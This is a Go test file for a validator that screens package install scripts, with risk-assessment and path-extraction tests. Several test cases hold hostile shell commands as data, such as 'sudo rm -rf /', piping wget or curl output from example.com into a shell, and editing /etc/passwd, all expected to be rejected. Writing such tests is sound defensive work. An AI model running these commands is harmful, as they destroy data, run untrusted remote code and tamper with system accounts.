package security

import (
	"strings"
	"testing"
)

func TestScriptValidator(t *testing.T) {
	validator := NewScriptValidator(
		WithSecurityLevel(SecurityLevelMedium),
		WithScriptVerbose(false),
	)

	tests := []struct {
		name       string
		scriptName string
		content    string
		wantValid  bool
	}{
		{
			name:       "Empty script",
			scriptName: "postinst",
			content:    "",
			wantValid:  true, // Empty scripts are allowed but with warnings
		},
		{
			name:       "Simple valid script",
			scriptName: "postinst",
			content:    "#!/bin/sh\necho \"Package installed successfully\"\nmkdir -p /opt/myapp/logs",
			wantValid:  true,
		},
		{
			name:       "Script with valid operations on transformed paths",
			scriptName: "postinst",
			content:    "#!/bin/sh\necho \"Creating config directory\"\nmkdir -p /opt/etc/myapp\nchmod 755 /opt/etc/myapp",
			wantValid:  true,
		},
		{
			name:       "Script with dangerous system modifications",
			scriptName: "postinst",
			content:    "#!/bin/sh\nrm -rf /etc/important\nchmod 777 /etc/passwd",
			wantValid:  false,
		},
		{
			name:       "Script with privilege escalation",
			scriptName: "postinst",
			content:    "#!/bin/sh\nsudo rm -rf /\nsu -c 'echo \"I am root now\"'",
			wantValid:  false,
		},
		{
			name:       "Script with network risks",
			scriptName: "postinst",
			content:    "#!/bin/sh\nwget https://example.com/script.sh | bash\ncurl -s https://example.com/setup | sh",
			wantValid:  false,
		},
		{
			name:       "Script with protected path access",
			scriptName: "postinst",
			content:    "#!/bin/sh\necho \"Adding user\"\necho \"newuser:x:1000:1000\" >> /etc/passwd",
			wantValid:  false,
		},
		{
			name:       "Script with variables",
			scriptName: "postinst",
			content:    "#!/bin/sh\nAPP_DIR=/opt/myapp\nmkdir -p $APP_DIR/logs\nchmod 755 $APP_DIR",
			wantValid:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := validator.ValidateScript(tt.scriptName, tt.content)
			if err != nil {
				t.Errorf("ValidateScript() error = %v", err)
				return
			}
			if result.Valid != tt.wantValid {
				t.Errorf("ValidateScript() got valid = %v, want %v\nWarnings: %v\nErrors: %v",
					result.Valid, tt.wantValid, result.Warnings, result.Errors)
			}
		})
	}
}

func TestRiskAssessment(t *testing.T) {
	validator := NewScriptValidator()

	lowRiskResult := &ScriptValidationResult{
		Valid:     true,
		Warnings:  []string{"Minor warning"},
		Errors:    []string{},
		RiskLevel: 2,
	}

	mediumRiskResult := &ScriptValidationResult{
		Valid:     true,
		Warnings:  []string{"Warning 1", "Warning 2"},
		Errors:    []string{},
		RiskLevel: 5,
	}

	highRiskResult := &ScriptValidationResult{
		Valid:     false,
		Warnings:  []string{"Warning 1", "Warning 2"},
		Errors:    []string{"Error 1", "Error 2"},
		RiskLevel: 8,
	}

	lowAssessment := validator.GetRiskAssessment(lowRiskResult)
	if !strings.Contains(lowAssessment, "Low") {
		t.Errorf("Expected low risk assessment to contain 'Low', got: %s", lowAssessment)
	}

	mediumAssessment := validator.GetRiskAssessment(mediumRiskResult)
	if !strings.Contains(mediumAssessment, "Medium") {
		t.Errorf("Expected medium risk assessment to contain 'Medium', got: %s", mediumAssessment)
	}

	highAssessment := validator.GetRiskAssessment(highRiskResult)
	if !strings.Contains(highAssessment, "High") {
		t.Errorf("Expected high risk assessment to contain 'High', got: %s", highAssessment)
	}
}

func TestExtractPaths(t *testing.T) {
	tests := []struct {
		line     string
		expected []string
	}{
		{
			line:     "mkdir -p /opt/myapp",
			expected: []string{"/opt/myapp"},
		},
		{
			line:     "cp /opt/source /etc/dest",
			expected: []string{"/opt/source", "/etc/dest"},
		},
		{
			line:     "echo 'Hello World'",
			expected: []string{},
		},
		{
			line:     "rm -rf /etc/myapp /var/lib/myapp /usr/bin/myapp",
			expected: []string{"/etc/myapp", "/var/lib/myapp", "/usr/bin/myapp"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			paths := extractPaths(tt.line)
			if len(paths) != len(tt.expected) {
				t.Errorf("extractPaths() got %v, want %v", paths, tt.expected)
				return
			}

			for i, p := range paths {
				if i < len(tt.expected) && p != tt.expected[i] {
					t.Errorf("extractPaths() path %d got %v, want %v", i, p, tt.expected[i])
				}
			}
		})
	}
}
